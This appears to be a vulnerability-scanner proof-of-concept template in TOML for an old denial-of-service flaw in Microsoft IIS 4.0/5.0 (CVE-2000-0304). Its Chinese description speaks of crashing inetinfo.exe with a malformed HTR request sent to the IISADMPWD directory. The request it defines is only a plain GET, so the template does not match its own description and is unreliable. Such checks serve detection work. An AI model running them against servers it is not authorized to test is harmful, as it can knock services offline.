[info]
author = "AVE"
description = "向 IISADMPWD 虚拟目录发送畸形未分隔的 HTR 请求，触发 inetinfo.exe 解析异常导致进程崩溃，验证 IIS 拒绝服务漏洞存在"
id = "POC-AVE-2000-0295"
name = "Microsoft IIS 4.0/5.0 HTR请求拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0295"]
vuln_id = [
    "CVE-2000-0304",
    "AVE-2000-0295",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/IISADMPWD/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "Server Error",
]
